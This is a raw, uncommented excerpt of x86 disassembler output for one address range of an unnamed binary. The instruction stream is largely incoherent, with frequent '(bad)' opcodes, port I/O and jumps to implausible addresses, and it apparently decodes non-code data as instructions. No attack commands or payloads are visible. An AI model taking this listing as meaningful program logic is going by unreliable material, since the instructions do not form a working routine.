  4142f5:	pop    ds
  4142f6:	and    BYTE PTR [esi-0x71],al
  4142f9:	xchg   esp,eax
  4142fa:	bound  eax,QWORD PTR [ebp-0x16f76779]
  414300:	(bad)  
  414301:	jae    0x41437e
  414303:	int3   
  414304:	sbb    dl,BYTE PTR [eax+ebx*1]
  414307:	in     eax,dx
  414308:	(bad)  
  414309:	xchg   esp,eax
  41430a:	jg     0x414374
	...
  414320:	js     0x4142b9
  414322:	or     cl,ch
  414324:	dec    edi
  414325:	pop    edx
  414326:	xchg   ebp,ebp
  414328:	jnp    0x41439d
  41432a:	cmc    
  41432b:	icebp  
  41432c:	(bad)  
  41432d:	xchg   esp,eax
  41432e:	or     BYTE PTR [eax+0x11],dh
  414331:	mov    ds:0x178fe90c,eax
  414336:	je     0x4142fd
  414338:	pop    ebx
  414339:	jae    0x4142bd
  41433b:	jo     0x4143a4
  41433d:	xchg   edi,eax
  41433e:	or     cl,ch
  414340:	sbb    ebx,DWORD PTR [esi+0x5489e882]
  414346:	imul   BYTE PTR [ecx-0x12356b49]
  41434c:	pop    DWORD PTR [edi+eiz*1-0x55]
  414350:	sub    esi,DWORD PTR [ebx-0x76]
  414353:	push   0xe908972b
  414358:	xchg   al,ch
  41435a:	adc    esi,DWORD PTR [edx+0x8]
  41435d:	mov    ds:0x1d8fe90c,eax
  414362:	xchg   ecx,esi
  414364:	add    esi,DWORD PTR [ebx-0xb]
  414367:	sub    DWORD PTR [edi+0x14],ecx
  41436a:	adc    al,0xed
  41436c:	(bad)  
  41436d:	xchg   esp,eax
  41436e:	add    cl,ch
  414370:	(bad)  
  414371:	xchg   esp,eax
  414372:	jg     0x4143dc
  414374:	fist   WORD PTR [esi+0x1c5ae908]
  41437a:	adc    ch,ch
  41437c:	(bad)  
  41437d:	xchg   esp,eax
  41437e:	fmul   DWORD PTR [eax]
  414380:	push   ebx
  414381:	push   ss
  414382:	xchg   ebp,esi
	...
  414398:	ret    
  414399:	jb     0x414390
  41439b:	dec    esi
  41439c:	sbb    al,0x90
  41439e:	add    DWORD PTR [eax],0x96724
  4143a4:	mov    ch,0xef
  4143a6:	mov    BYTE PTR [eax],bl
  4143a8:	mov    cl,0x96
  4143aa:	or     BYTE PTR [eax+0x72],al
  4143ad:	sbb    BYTE PTR [ecx],dl
  4143af:	add    al,0xa5
  4143b1:	xchg   esi,eax
  4143b2:	add    BYTE PTR [eax],al
  4143b4:	jne    0x41434c
  4143b6:	jg     0x414339
  4143b8:	test   DWORD PTR [edx-0xb],esi
  4143bb:	(bad)  
  4143bc:	out    dx,al
  4143bd:	lock sbb eax,0x82966504
  4143c3:	add    DWORD PTR [edi-0x2a],esi
  4143c6:	repz shr ch,0x98
  4143ca:	leave  
  4143cb:	mov    esi,DWORD PTR [ecx]
  4143cd:	push   edx
  4143ce:	or     DWORD PTR [ebx+0x55097491],ecx
  4143d4:	and    DWORD PTR [ebx],0x3a
  4143d7:	imul   BYTE PTR [eax+0x5d8af52d]
  4143dd:	sbb    dh,ch
  4143df:	add    DWORD PTR [ecx+edx*4],edx
  4143e2:	dec    ebx
  4143e3:	lea    eax,[ecx+0x25]
  4143e6:	mov    bh,al
  4143e8:	xor    al,0x5
  4143ea:	in     eax,0x83
  4143ec:	fist   DWORD PTR [ebp-0x6415004d]
  4143f2:	test   BYTE PTR [ebp+0x72796da8],0xc6
  4143f9:	out    dx,eax
  4143fa:	test   BYTE PTR [ecx],0x0
	...
  41440d:	add    BYTE PTR [eax],al
  41440f:	add    BYTE PTR [esp+edi*2+0x9],cl
  414413:	add    ch,ah
  414415:	and    dl,BYTE PTR [eax]
  414417:	mov    esi,DWORD PTR [eax+ebp*2+0x9]
  41441b:	add    ch,dh
  41441d:	out    dx,al
  41441e:	mov    BYTE PTR [eax],bl
  414420:	icebp  
  414421:	xchg   ebp,eax
  414422:	or     BYTE PTR [eax+0x5c],al
  414425:	fst    QWORD PTR [ecx]
  414427:	add    al,0xb5
  414429:	xchg   ebp,eax
  41442a:	jg     0x4143ad
  41442c:	mov    WORD PTR [ebx-0xb],gs
  41442f:	(bad)  
  414430:	mov    ebx,0x881789f6
  414435:	jnp    0x414440
  414437:	test   dh,0x7c
  41443a:	test   DWORD PTR [ecx],ecx
  41443c:	push   ss
  41443d:	inc    esp
  41443e:	or     ebx,ebx
  414440:	call   0x397d:0xa71774be
  414447:	pop    ds
  414448:	(bad)  
  414449:	(bad)  
  41444a:	loopne 0x41444f
  41444c:	mov    WORD PTR [ebx-0x7a],?
  41444f:	sbb    BYTE PTR [edi],al
  414451:	cld    
  414452:	cld    
  414453:	add    ecx,DWORD PTR [ebx+edi*2+0x77848072]
  41445a:	or     DWORD PTR [eax],eax
  41445c:	int3   
  41445d:	hlt    
  41445e:	inc    ecx
  41445f:	sbb    edx,DWORD PTR [eax+0xd89097b]
  414465:	imul   esi,ebp,0xffffffff
  414468:	dec    ebx
  414469:	out    0x8a,al
  41446b:	pop    ss
  41446c:	mov    BYTE PTR [ebx+0x9],bh
  41446f:	mov    dl,BYTE PTR [ebp+edi*2+0xfd24]
	...
  414486:	add    BYTE PTR [eax],al
  414488:	dec    edi
  414489:	or     al,0x13
  41448b:	cmp    BYTE PTR [edx],0x7c
  41448e:	jno    0x4144a7
  414490:	cdq    
  414491:	int    0xa4
  414493:	add    ch,ah
  414495:	pop    esi
  414496:	cmc    
  414497:	call   DWORD PTR [ebx]
  414499:	nop
  41449a:	loope  0x414426
  41449c:	or     eax,0x3fff56b
  4144a1:	hlt    
  4144a2:	mov    dl,BYTE PTR [edi]
  4144a4:	nop
  4144a5:	jnp    0x4144b0
  4144a7:	inc    eax
  4144a8:	add    eax,0x8c03edd4
  4144ad:	jnp    0x414521
  4144af:	cmp    BYTE PTR [edi+edi*2+0x9],0x0
  4144b4:	pop    es
  4144b5:	cld    
  4144b6:	loope  0x4144bb
  4144b8:	mov    WORD PTR [edi+ebx*8-0x246d32ef],ss
  4144bf:	std    
  4144c0:	adc    eax,0xb935e184
  4144c5:	push   ebp
  4144c6:	repz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  4144c9:	xchg   ebp,eax
  4144ca:	pavgw  mm1,QWORD PTR [ebx+edi*1+0x70a3ffd3]
  4144d2:	mov    ah,0xea
  4144d4:	push   es
  4144d5:	adc    ecx,edi
  4144d7:	call   DWORD PTR [ebx-0x5c7d8790]
  4144dd:	cwde   
  4144de:	fild   WORD PTR [ebx]
  4144e0:	int3   
  4144e1:	sbb    eax,0x948fe758
  4144e6:	fistp  QWORD PTR [edx+0xc]
  4144e9:	test   ebx,esp
  4144eb:	add    eax,DWORD PTR [eax]
	...
  4144fd:	add    BYTE PTR [eax],al
  4144ff:	add    BYTE PTR [ebx+ebx*1-0x6b701488],cl
  414506:	fbstp  TBYTE PTR [ebx]
  414508:	lods   al,BYTE PTR ds:[esi]
  414509:	iret   
  41450a:	test   DWORD PTR [esi-0x4d2066b3],esp
  414510:	loopne 0x41452d
  414512:	inc    ebx
  414513:	loopne 0x4144a8
  414515:	(bad)  
  414516:	adc    al,BYTE PTR [edx+eiz*8+0x13]
  41451a:	(bad)  
  41451b:	idiv   DWORD PTR [ecx+0x2bf78c99]
  414521:	jo     0x414502
  414523:	jp     0x4144cc
  414525:	mov    eax,0xbc227ad3
  41452a:	mov    esp,0xdfb8af79
  41452f:	jns    0x4144db
  414531:	sbb    dl,cl
  414533:	nop
  414534:	mov    ds:0xe17bac1b,eax
  414539:	and    DWORD PTR [edx+0x4],edi
  41453c:	mov    WORD PTR [edi+ebx*8-0x12177a37],ss
  414543:	mov    esp,0xa008194d
  414548:	std    
  414549:	imul   ecx,DWORD PTR [ecx-0x40e72c57],0xc812c7dc
  414553:	jmp    0x4144fb
  414555:	xchg   edx,eax
  414556:	mov    DWORD PTR [ecx],ebp
  414558:	mov    ebx,0x146a4ed6
  41455d:	mov    ah,0x14
  41455f:	call   0x9f96a760
	...
  414578:	hlt    
  414579:	retf   0xe5ca
  41457c:	(bad)  
  41457d:	sbb    ebx,DWORD PTR [ebp+eax*1-0x74]
  414581:	leave  
  414582:	pop    esi
  414583:	jb     0x414526
  414585:	push   esi
  414586:	mov    ss,ecx
  414588:	sub    DWORD PTR [edi-0xb],0xffffffe9
  41458c:	(bad)  
  41458d:	xchg   esp,eax
  41458e:	or     BYTE PTR [ebx+0x76],ah
  414591:	adc    edi,DWORD PTR [edi+0x7bfebf6]
  414597:	jmp    0x75c30d2b
  41459c:	cmp    eax,DWORD PTR [ebx-0x16a51177]
  4145a2:	or     esp,DWORD PTR [esi-0x160a90be]
  4145a8:	(bad)  
  4145a9:	push   ebp
  4145aa:	and    DWORD PTR [esi+0x5500adbf],ebp
  4145b0:	neg    ch
  4145b2:	dec    eax
  4145b3:	ins    BYTE PTR es:[edi],dx
  4145b4:	xchg   edx,eax
  4145b5:	call   0x8be2b0b8
  4145ba:	or     al,0xe9
  4145bc:	(bad)  
  4145bd:	outs   dx,DWORD PTR ds:[esi]
  4145be:	jnp    0x41458c
  4145c0:	xchg   esi,eax
  4145c1:	sbb    DWORD PTR [eax],ebx
  4145c3:	in     eax,dx
  4145c4:	(bad)  
  4145c5:	xchg   esp,eax
  4145c6:	jg     0x41462f
  4145c8:	not    DWORD PTR [edx+0x55cfe908]
  4145ce:	mov    gs,ebp
  4145d0:	rep outs dx,BYTE PTR ds:[esi]
  4145d2:	cmc    
  4145d3:	add    ch,bl
  4145d5:	xchg   edx,eax
  4145d6:	or     BYTE PTR [eax],al
  4145d8:	pop    esp
  4145d9:	icebp  
  4145da:	add    eax,0x4
	...
  4145ef:	add    ch,ah
  4145f1:	xchg   edx,eax
  4145f2:	add    DWORD PTR [esi-0xa9143],0x86827385
  4145fc:	lds    ebp,FWORD PTR [esi-0xb]
  4145ff:	jmp    FWORD PTR [edi]
  414601:	ins    DWORD PTR es:[edi],dx
  414602:	push   esi
  414603:	mov    BYTE PTR [ebp-0x46ef746b],ch
  414609:	xchg   edx,eax
  41460a:	or     BYTE PTR [esi+0x0],bl
  41460d:	aad    0xd
  41460f:	add    BYTE PTR [eax],ch
  414611:	xchg   esi,eax
  414612:	jns    0x4145cc
  414614:	es mov al,0xf6
  414617:	add    DWORD PTR [ebx],eax
  414619:	jbe    0x414624
  41461b:	add    BYTE PTR [ebp-0x13],dh
  41461e:	pusha  
  41461f:	or     DWORD PTR [eax],ebx
  414621:	add    DWORD PTR [edx-0xa918a7a],0x1defdcff
  41462b:	add    al,0x75
  41462d:	xchg   edx,eax
  41462e:	dec    eax
  41462f:	mov    ebx,edx
  414631:	jne    0x41463c
  414633:	add    BYTE PTR [ebp-0xf],ah
  414636:	mov    edx,DWORD PTR [eax]
  414638:	cmp    DWORD PTR [edx-0x7f5474f8],edx
  41463e:	or     DWORD PTR [eax],eax
  414640:	and    eax,0xf70205ec
  414645:	xchg   esi,eax
  414646:	(bad)  
  414647:	mov    BYTE PTR [ebp-0x6d],al
  41464a:	xchg   BYTE PTR [ecx+ebp*1],bl
  41464d:	xchg   edx,eax
  41464e:	or     BYTE PTR [ebp+0x3c],dh
  414651:	in     eax,dx
  414652:	mov    edx,DWORD PTR [eax]
	...
  414668:	sub    DWORD PTR [edx-0x7f8476f8],edx
  41466e:	or     DWORD PTR [eax],eax
  414670:	cmc    
  414671:	push   ecx
  414672:	sub    BYTE PTR [esi-0xa9874],0xf3
  414679:	hlt    
  41467a:	jbe    0x41468b
  41467c:	nop
  41467d:	jnp    0x414688
  41467f:	mov    ecx,DWORD PTR [edx]
  414681:	je     0x414678
  414683:	(bad)  
  414684:	fcomi  st,st(1)
  414686:	cld    
  414687:	add    DWORD PTR [esi-0x6378b503],edi
  41468d:	jl     0x41470a
  41468f:	sbb    ecx,DWORD PTR [eax-0x6a8af685]
  414695:	bnd jbe 0x4146a7
  414698:	mov    BYTE PTR [ebx+0x9],bh
  41469b:	mov    DWORD PTR [edx],edx
  41469d:	je     0x414694
  41469f:	jmp    DWORD PTR [ebx+0x78ad723b]
  4146a5:	jg     0x4146b0
  4146a7:	add    BYTE PTR ds:0x8c03fcf6,al
  4146ad:	jnp    0x41471f
  4146af:	test   DWORD PTR [edi+esi*2+0x73060009],esp
  4146b6:	pop    es
  4146b7:	leave  
  4146b8:	jb     0x414676
  4146ba:	outs   dx,DWORD PTR ds:[esi]
  4146bb:	(bad)  
  4146bc:	scas   eax,DWORD PTR es:[edi]
  4146bd:	nop
  4146be:	je     0x4146c7
  4146c0:	mov    esi,0x35e73ee2
  4146c5:	addr16 or al,0xfe
  4146c8:	pop    es
  4146c9:	mov    dh,0x87
  4146cb:	fild   WORD PTR [eax]
	...
  4146dd:	add    BYTE PTR [eax],al
  4146df:	add    BYTE PTR [eax+0x34cd6fab],dl
  4146e5:	aas    
  4146e6:	or     eax,0x3cf23bfe
  4146eb:	sub    BYTE PTR ds:0x5a8aba79,0x43
  4146f2:	dec    esp
  4146f3:	sti    
  4146f4:	and    ebp,DWORD PTR [esi]
  4146f6:	mov    dh,ah
  4146f8:	lea    ecx,[esi-0x18db3291]
  4146fe:	or     eax,0x4e940bfe
  414703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414704:	pusha  
  414705:	push   edx
  414706:	test   DWORD PTR [ebx],0x29e5b0f
  41470c:	add    dl,BYTE PTR [eax+0x1f8c03eb]
  414712:	sbb    bl,bh
  414714:	pop    eax
  414715:	mov    edi,DWORD PTR [edx+0x7d]
  414718:	mov    ebx,DWORD PTR [eax+0x160503df]
  41471e:	xlat   BYTE PTR ds:[ebx]
  41471f:	dec    ebx
  414721:	ins    BYTE PTR es:[edi],dx
  414722:	lahf   
  414723:	jp     0x414716
  414725:	(bad)  
  414726:	jmp    0x41472b
  414728:	mov    WORD PTR [ebx],ds
  41472a:	gs repz (bad) 
  41472d:	xchg   esp,eax
  41472e:	fistp  QWORD PTR [eax+0x11]
  414731:	mov    ebx,fs
  414733:	add    ecx,DWORD PTR [edx+ebx*1+0x6dbe01cf]
  41473a:	and    DWORD PTR [ebx-0x7d],edi
  41473d:	xchg   ebx,eax
  41473e:	push   ebp
  41473f:	out    0x8f,eax
  414741:	xchg   esp,eax
  414742:	fisttp WORD PTR [esi+0x0]
	...
  414758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414759:	pop    ds
  41475a:	ins    DWORD PTR es:[edi],dx
  41475b:	repz (bad) 
  41475d:	xchg   esp,eax
  41475e:	fistp  QWORD PTR [edx+0x9]
  414761:	(bad)  
  414762:	jmp    0x414767
  414764:	mov    esp,ss
  414766:	js     0x4147bd
  414768:	xchg   DWORD PTR [eax+0x130503df],edx
  41476e:	iret   
  41476f:	call   DWORD PTR [ebx+0x6c]
  414772:	push   0x7d
  414774:	mov    ds:0x1603df90,eax
  414779:	test   ecx,esp
  41477b:	aad    0x3a
  41477d:	push   edi
  41477e:	addr16 adc al,0x33
  414781:	sbb    ah,bl
  414783:	pop    es
  414784:	mov    WORD PTR [esp+esi*1-0x30eceae3],ss
  41478b:	pop    es
  41478c:	mov    WORD PTR [eax+ecx*1+0xc8d0660],ss
  414793:	jmp    0x57c11c27
  414798:	lods   al,BYTE PTR ds:[esi]
  414799:	nop
  41479a:	or     cl,ch
  41479c:	or     BYTE PTR [ebx],dl
  41479e:	sbb    ch,ch
  4147a0:	(bad)  
  4147a1:	xchg   esp,eax
  4147a2:	and    DWORD PTR [edi-0x78],0x11e90890
  4147a9:	test   DWORD PTR [edx],ecx
  4147ab:	fwait
  4147ac:	mov    ss,WORD PTR [edi-0x80]
  4147af:	(bad)  [eax-0x701aebe6]
  4147b5:	xchg   esp,eax
  4147b6:	jnp    0x4147b8
  4147b8:	adc    edx,DWORD PTR [ebx]
  4147ba:	sbb    ch,ah
	...
  4147d0:	(bad)  
  4147d1:	xchg   esp,eax
  4147d2:	jg     0x414843
  4147d4:	nop
  4147d5:	nop
  4147d6:	or     cl,ch
  4147d8:	dec    edi
  4147d9:	adc    esp,DWORD PTR [esi+0x8948be5]
  4147df:	jo     0x4147e7
  4147e1:	test   DWORD PTR [ecx+ebp*8],ecx
  4147e4:	(bad)  
  4147e5:	sbb    eax,0x9493d18e
  4147ea:	or     BYTE PTR [ecx],bh
  4147ec:	test   al,0x6b
  4147ee:	cmp    ebp,0xffffff93
  4147f1:	xchg   esp,eax
  4147f2:	or     BYTE PTR [eax+edx*4-0x6c0671e3],bl
  4147f9:	xchg   esp,eax
  4147fa:	or     BYTE PTR [eax+0x16],dh
  4147fd:	mov    WORD PTR [ecx+ebp*8],cs
  414800:	(bad)  
  414801:	aam    0x7f
  414803:	inc    edi
  414804:	lods   al,BYTE PTR ds:[esi]
  414805:	nop
  414806:	or     cl,ch
  414808:	sbb    BYTE PTR [edx],dl
  41480a:	sbb    ch,ch
  41480c:	(bad)  
  41480d:	xchg   esp,eax
  41480e:	and    DWORD PTR [edi-0x69],0x5fe90890
  414815:	mov    ah,0x7
  414817:	pop    edi
  414818:	mov    edx,DWORD PTR [eax-0x13cafff8]
  41481e:	sbb    eax,0xc87b38b
  414823:	add    BYTE PTR ds:0xf1188e18,ah
  414829:	xchg   esi,eax
  41482a:	or     BYTE PTR [eax+0x7c],al
  41482d:	and    eax,0x96e50414
  414832:	lea    eax,[esi+0x0]
	...
  414848:	cmc    
  414849:	xchg   edx,eax
  41484a:	or     BYTE PTR [eax],al
  41484c:	outs   dx,BYTE PTR ds:[esi]
  41484d:	sbb    eax,0x96f50410
  414852:	fsub   DWORD PTR [eax]
  414854:	in     al,0x4
  414856:	adc    al,0x4
  414858:	in     eax,0x96
  41485a:	jns    0x414875
  41485c:	cs sbb eax,0x96b50418
  414862:	lea    eax,[esi+0x89c8d]
  414868:	in     eax,0x17
  41486a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41486b:	sbb    al,0xb1
  41486d:	xchg   esi,eax
  41486e:	or     BYTE PTR [ecx+0xc8733],cl
  414874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414875:	sbb    DWORD PTR [esi+0x896a118],edi
  41487b:	rcl    BYTE PTR [ebx+0x7dc251f6],1
  414881:	xchg   esi,eax
  414882:	jg     0x4148c8
  414884:	push   ecx
  414885:	xchg   edx,eax
  414886:	pop    esi
  414887:	push   edi
  414888:	out    dx,al
  414889:	jmp    0x612f58ba
  41488e:	xor    DWORD PTR [eax+0x73089675],eax
  414894:	cmp    DWORD PTR [ebx],edx
  414896:	repz add al,0xd6
  414899:	mov    gs,WORD PTR [edi]
  41489b:	xchg   BYTE PTR [ecx-0x6e],dl
  41489e:	or     BYTE PTR [eax],al
  4148a0:	loope  0x41486e
  4148a2:	sti    
  4148a3:	fmul   DWORD PTR [esi-0x731f78b0]
  4148a9:	jns    0x414913
  4148ab:	add    DWORD PTR [eax],0x0
	...
  4148bd:	add    BYTE PTR [eax],al
  4148bf:	add    BYTE PTR [ecx+esi*2+0x67],cl
  4148c3:	ret    0x7b94
  4148c6:	xor    al,0x86
  4148c8:	jo     0x414939
  4148ca:	or     DWORD PTR [eax],eax
  4148cc:	cwde   
  4148cd:	pusha  
  4148ce:	or     BYTE PTR ss:[ebx+edi*2-0x1768ef7],0xf7
  4148d7:	add    ah,bh
  4148d9:	imul   esi,DWORD PTR [esi],0x0
  4148dc:	mov    DWORD PTR [ebx+0x9],edi
  4148df:	jb     0x41486e
  4148e1:	mov    dh,BYTE PTR ds:0x97b6100
  4148e7:	jb     0x414876
  4148e9:	mov    edx,0x8e84e8c9
  4148ee:	mov    eax,eax
  4148f0:	(bad)  
  4148f1:	mov    esp,esp
  4148f3:	es (bad) 
  4148f5:	repnz pop es
  4148f7:	push   esi
  4148f8:	pop    es
  4148f9:	mov    edx,0x5fa4d883
  4148fe:	repz std 
  414900:	stos   DWORD PTR es:[edi],eax
  414901:	enter  0x1840,0x96
  414905:	ss push 0x963ce5e
  41490b:	push   ebp
  41490c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41490d:	outs   dx,DWORD PTR ds:[esi]
  41490e:	repz std 
  414910:	mov    ebx,DWORD PTR [edx]
  414912:	mov    eax,es
  414914:	mov    BYTE PTR [ecx-0x35],dl
  414917:	or     BYTE PTR [esi+ebp*1+0x73a85c84],cl
  41491e:	pop    esi
  41491f:	push   esi
  414920:	pop    ss
  414921:	mov    WORD PTR [ebx+0xbe],cs
	...
  414937:	add    BYTE PTR [edi+esi*2+0x28c0009],dh
  41493e:	sbb    BYTE PTR [edi+esi*2+0xd00097c],al
  414945:	mov    WORD PTR [eax],ax
  414948:	mov    WORD PTR [edi+ebx*8+0x53157b74],ss
  41494f:	sub    BYTE PTR [eax+edx*4-0x5ecbc1ae],dl
  414956:	fiadd  DWORD PTR [eax]
  414958:	and    bl,BYTE PTR ds:0x6d5cebbd
  41495e:	mov    dh,0x0
  414960:	push   es
  414961:	pop    edx
  414962:	(bad)  
  414963:	std    
  414964:	push   es
  414965:	imul   esp,DWORD PTR [esi+0x7b0488d],0xeb84228d
  41496f:	add    ecx,DWORD PTR [esi+ebx*1-0x6d14d856]
  414976:	test   al,0x5
  414978:	and    ecx,ecx
  41497a:	ja     0x414981
  41497c:	fst    DWORD PTR [ecx]
  41497e:	iret   
  41497f:	pop    es
  414980:	mov    WORD PTR [eax+ebp*2-0x206f8f5f],ss
  414987:	add    esp,DWORD PTR [edx-0x39]
  41498a:	retf   0x84c5
  41498d:	xchg   esp,eax
  41498e:	(bad)  
  41498f:	shl    BYTE PTR [ecx-0x6fe0626e],1
  414995:	xchg   esp,eax
  414996:	fisttp WORD PTR [esi+0x1ab49b31]
	...
  4149b0:	add    eax,0x8c07cf12
  4149b5:	xchg   esp,eax
  4149b6:	push   0xdf90a489
  4149bb:	add    ecx,esp
  4149bd:	sbb    eax,0x94901f5d
  4149c2:	fisttp WORD PTR [edx+0x3e3850a]
  4149c8:	mov    WORD PTR [ebx],ds
  4149ca:	ins    DWORD PTR es:[edi],dx
  4149cb:	sbb    ecx,DWORD PTR [eax-0x7b72206c]
  4149d1:	xchg   edx,eax
  4149d2:	cmp    BYTE PTR [ecx],al
  4149d4:	dec    esp
  4149d5:	sbb    eax,0x268ee108
  4149da:	adc    al,0xe5
  4149dc:	(bad)  
  4149dd:	xchg   esp,eax
  4149de:	jnp    0x4149e0
  4149e0:	pop    es
  4149e1:	(bad)  
  4149e3:	in     eax,0x8f
  4149e5:	xchg   esp,eax
  4149e6:	jg     0x414a57
  4149e8:	mov    BYTE PTR [eax+0xfcfe908],dl
  4149ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ef:	in     eax,0x93
  4149f1:	xchg   esp,eax
  4149f2:	or     BYTE PTR [eax+0xa],dh
  4149f5:	test   DWORD PTR [ecx+ebp*8],ecx
  4149f8:	(bad)  
  4149f9:	sbb    eax,0x948bd18e
  4149fe:	or     BYTE PTR [ecx-0x5726e250],bh
  414a04:	out    0x9c,al
  414a06:	mov    DWORD PTR [ebx-0x607e3d72],ebp
  414a0c:	lock dec edi
  414a0e:	repnz xchg bl,bl
  414a11:	sbb    eax,0xd98e
	...
  414a26:	add    BYTE PTR [eax],al
  414a28:	mov    edx,DWORD PTR [eax+ecx*1+0x72ca861]
  414a2f:	jmp    0x6f48dec3
  414a34:	mov    al,ds:0xe90890
  414a39:	pop    es
  414a3a:	sub    al,0xed
  414a3c:	(bad)  
  414a3d:	xchg   esp,eax
  414a3e:	xchg   DWORD PTR [edx+0x8],edx
  414a41:	xchg   ebp,eax
  414a42:	or     cl,ch
  414a44:	push   ds
  414a45:	mov    WORD PTR [ecx+0xa8c6bcd],cs
  414a4b:	(bad)  
  414a4c:	fdiv   QWORD PTR [eax+0x56169810]
  414a52:	loopne 0x414ad2
  414a54:	jbe    0x414abf
  414a56:	cmc    
  414a57:	mov    esi,0x2b51cbd1
  414a5c:	cwde   
  414a5d:	xchg   esp,eax
  414a5e:	xchg   DWORD PTR [edx],edx
  414a60:	mov    BYTE PTR [ebx-0x1a9afff8],dl
  414a66:	or     al,0x29
  414a68:	sub    DWORD PTR [edi-0x6cc17ef0],ebp
  414a6e:	jno    0x414a70
  414a70:	xor    eax,0x69290ce5
  414a75:	mov    esp,0xbc618b10
  414a7a:	adc    BYTE PTR [ecx-0x52],dl
  414a7d:	pop    ecx
  414a7e:	loopne 0x414aec
  414a80:	aas    
  414a81:	repz pop di
  414a84:	jae    0x414a7b
  414a86:	dec    edi
  414a87:	ret    0x931d
  414a8a:	retf   
  414a8b:	xchg   BYTE PTR [eax],al
	...
  414a9d:	add    BYTE PTR [eax],al
  414a9f:	add    BYTE PTR [ebp-0xbfff764],cl
  414aa5:	xchg   edx,eax
  414aa6:	or     BYTE PTR [eax],al
  414aa8:	fs push 0xffffff88
  414aab:	add    ch,ah
  414aad:	xchg   edx,eax
  414aae:	ja     0x414af9
  414ab0:	jbe    0x414a99
  414ab2:	sub    al,0x18
  414ab4:	jmp    0x737c959a
  414ab9:	scas   eax,DWORD PTR es:[edi]
  414aba:	or     al,0x0
  414abc:	in     eax,0xde
  414abe:	xor    ch,al
  414ac0:	scas   eax,DWORD PTR es:[edi]
  414ac1:	ins    BYTE PTR es:[edi],dx
  414ac2:	repz jmp FWORD PTR [esi]
  414ac5:	pop    ecx
  414ac6:	loopne 0x414acb
  414ac8:	das    
  414ac9:	repz mov sp,WORD PTR [ebx+0x7b]
  414ace:	sar    ecx,0x42
  414ad1:	data16 add BYTE PTR [ecx+ecx*4-0x78],0x7f
  414ad7:	mov    ?,WORD PTR [ebp+0x1f00088e]
  414add:	inc    edx
  414ade:	sub    al,0x1
  414ae0:	ja     0x414b26
  414ae2:	or     al,dl
  414ae4:	adc    bl,BYTE PTR [edx]
  414ae6:	cmc    
  414ae7:	(bad)  
  414ae8:	jmp    0x414a6b
  414aea:	or     al,0x0
  414aec:	sbb    DWORD PTR gs:[esi+0x9778c24],edx
  414af3:	add    dl,al
  414af5:	cmp    BYTE PTR [edx-0x3e],dl
  414af8:	test   BYTE PTR [ebx-0x76],bh
  414afb:	int    0x53
  414afd:	jge    0x414ab2
  414aff:	sbb    al,0x90
  414b01:	jnp    0x414b0c
  414b03:	mov    eax,DWORD PTR [eax]
	...
  414b15:	add    BYTE PTR [eax],al
  414b17:	add    BYTE PTR [ebx+0x7177074],dh
  414b1d:	neg    BYTE PTR [esp+eax*1]
  414b20:	mov    WORD PTR [ebx-0x7e],?
  414b23:	xchg   BYTE PTR [edi+esi*2-0xb33fff7],al
  414b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b2b:	sbb    al,0x90
  414b2d:	jnp    0x414b38
  414b2f:	xchg   DWORD PTR [edx],ecx
  414b31:	dec    esp
  414b32:	or     eax,0x8ef28c00
  414b37:	sbb    BYTE PTR [eax-0x6375f685],cl
  414b3d:	jns    0x414b16
  414b3f:	dec    dh
  414b41:	jecxz  0x414b5f
  414b43:	jmp    FWORD PTR [ecx]
  414b45:	pusha  
  414b46:	or     eax,0x11808c00
  414b4b:	mov    DWORD PTR [edx],edx
  414b4d:	dec    esp
  414b4e:	or     eax,0x8ee48c00
  414b53:	sbb    BYTE PTR [eax+0x1540097b],dl
  414b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b5a:	sub    BYTE PTR [esp+ecx*4],al
  414b5d:	jnp    0x414ae1
  414b5f:	xchg   BYTE PTR [edi+ebp*2-0x9e8fff7],bl
  414b66:	adc    al,0x4
  414b68:	mov    WORD PTR [ebx-0x27],?
  414b6b:	and    BYTE PTR [edi-0x13],dl
  414b6e:	and    BYTE PTR [esp+ecx*4],al
  414b71:	jnp    0x414bf0
  414b73:	jb     0x414b8c
  414b75:	mov    edx,0xfa94e8c9
  414b7a:	int3   
  414b7b:	add    DWORD PTR [eax],eax
	...
  414b8d:	add    BYTE PTR [eax],al
  414b8f:	add    ah,bl
  414b91:	xchg   esp,eax
  414b92:	pop    ss
  414b93:	xchg   esi,eax
  414b94:	jnp    0x414bfb
  414b96:	push   ss
  414b97:	mov    DWORD PTR [edx],ebx
  414b99:	test   bl,ah
  414b9b:	add    ecx,DWORD PTR [esp+ebx*1+0x655bbbf8]
  414ba2:	fild   WORD PTR [ebx]
  414ba4:	push   ebx
  414ba5:	bswap  edi
  414ba7:	pop    es
  414ba8:	mov    WORD PTR [eax+ebp*2-0x206f9762],ss
  414baf:	add    edi,DWORD PTR [ebx-0x73fca097]
  414bb5:	xchg   esp,eax
  414bb6:	push   edx
  414bb7:	sbb    al,0xd
  414bb9:	clc    
  414bba:	add    ebx,DWORD PTR [esi+ecx*4]
  414bbd:	sbb    DWORD PTR [ebx],edi
  414bbf:	sub    BYTE PTR [edx+eax*8+0x7a],dh
  414bc3:	int    0x24
  414bc5:	lock enter 0x9fc,0xc5
  414bca:	sbb    eax,0xe752655f
  414bcf:	add    edi,DWORD PTR [ebx+0x69]
  414bd2:	fild   WORD PTR [esi]
  414bd4:	mov    WORD PTR [ecx+edx*1-0x3c2f4cf8],ss
  414bdb:	sbb    esp,DWORD PTR [ebx+0x69]
  414bde:	fistp  QWORD PTR [esi-0x74]
  414be1:	xchg   esp,eax
  414be2:	icebp  
  414be3:	push   0xffffffab
  414be5:	ror    bl,1
  414be7:	sbb    edx,DWORD PTR ds:0x5e1bc3c0
  414bed:	sbb    DWORD PTR [ebp+0x6e6b83eb],edx
  414bf3:	cld    
	...
  414c08:	push   ecx
  414c09:	(bad)  
  414c0a:	mov    ah,0x58
  414c0c:	into   
  414c0d:	fild   WORD PTR [edx]
  414c10:	loop   0x414b99
  414c12:	jmp    0x414c17
  414c14:	mov    edi,ds
  414c16:	call   0xebc556a3
  414c1b:	add    ecx,DWORD PTR [ebp+ecx*1-0x675890f8]
  414c22:	or     cl,ch
  414c24:	iret   
